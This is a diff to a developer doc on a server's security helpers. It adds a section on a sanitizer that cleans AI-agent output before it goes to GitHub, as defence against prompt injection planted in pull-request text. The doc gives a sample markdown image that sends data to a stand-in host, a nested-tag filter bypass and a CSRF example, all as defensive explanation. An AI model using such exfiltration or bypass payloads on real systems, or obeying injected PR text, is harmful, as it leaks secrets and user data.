@@ -1,6 +1,6 @@
-# Security primitives: four small tools in `apps/server/src/lib/`
+# Security primitives: small tools in `apps/server/src/lib/`
 
-**In one sentence:** before the server handles sign-in, CLI tokens or webhooks, it needs four small, well-tested building blocks, and we port them from Odyhook instead of reinventing them.
+**In one sentence:** before the server handles sign-in, CLI tokens or webhooks, it needs four small, well-tested building blocks, and we port them from Odyhook instead of reinventing them. A fifth one, the output sanitizer, cleans what AI agents write before it reaches GitHub.
 
 ## Encryption at rest (`lib/crypto.ts`)
 
@@ -28,8 +28,20 @@ More on webhooks in `docs/why/webhooks.md`.
 
 Some routes use a cookie to know who you are, such as the "Approve this CLI" button. Browsers attach cookies automatically, so without a check, a page on `evil.example` could make *your* browser submit that form. CSRF (cross-site request forgery) is the name for this attack. Browsers tell us where a POST came from in the `Origin` header (or `Referer` as a fallback). `isAllowedOrigin` accepts only our own address, and says no when neither header is present.
 
+## Cleaning what agents write (`lib/sanitize.ts`)
+
+An AI agent reads the PR, and on a public repo anyone can put text in a PR, including text written to trick the agent ("prompt injection", explained in Plan 1b). So whatever an agent writes is treated as untrusted before Nitpilot posts it on GitHub (spec §14.6). `sanitizeForGithub`:
+
+- **Redacts secrets** such as GitHub tokens (`ghp_…`), Anthropic keys (`sk-ant-…`), AWS key ids, our own `nit_` tokens and private keys, in case the agent copied one from the environment or the code.
+- **Strips images and raw HTML.** An image is fetched when someone views the page, so `![x](https://evil.example/?data=…)` would send data to whoever owns that URL. Only the alt text is kept.
+- **Removes HTML comments**, because our own hidden marker (`<!-- nitpilot:v1 … -->`, see [dispatcher.md](dispatcher.md)) is one. Agent text must never be able to fake it.
+- **Defuses @mentions** of anyone outside the PR by wrapping them in backticks, so an agent can't ping strangers. Mentions inside code are left alone, since GitHub never pings from code.
+
+The removals run **again and again until nothing changes**. One pass isn't enough: in `<<b>img src=…>`, removing the inner `<b>` leaves a brand-new `<img src=…>`.
+
 ## The React analogy
 
 - Encryption at rest is like storing a value in `localStorage` only after encrypting it, so someone reading the disk can't use it.
 - Hashing tokens is how you'd treat passwords: you never show them again, you only check them.
 - The origin check is the server-side version of "only accept `postMessage` events whose `event.origin` is ours".
+- The sanitizer is what you'd do before `dangerouslySetInnerHTML` with user content: never trust it, strip what can run or phone home.
